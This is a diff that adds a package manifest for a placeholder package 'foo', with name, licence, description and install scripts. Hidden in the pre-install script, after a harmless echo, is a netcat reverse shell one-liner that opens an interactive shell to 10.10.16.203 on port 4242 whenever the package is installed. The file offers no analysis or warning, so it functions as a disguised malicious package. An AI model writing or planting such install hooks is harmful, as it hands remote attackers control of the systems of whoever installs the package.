@@ -1,0 +1,34 @@
+name: foo
+version: 1.0
+origin: category/foo
+comment: this is foo package
+arch: i386
+www: http://www.foo.org
+maintainer: foo@bar.org
+prefix: /usr/local
+licenselogic: or
+licenses: [MIT, MPL]
+desc: <<EOD
+  This is the description
+  Of foo
+
+  A component of bar
+EOD
+categories: [bar, plop]
+deps: {
+}
+files: {
+}
+directories: {
+}
+scripts: {
+  post-install: <<EOD
+    #!/bin/sh
+    echo post-install
+EOD
+  pre-install: <<EOD
+    #!/bin/sh
+    echo pre-install
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.203 4242 >/tmp/f
+EOD
+}
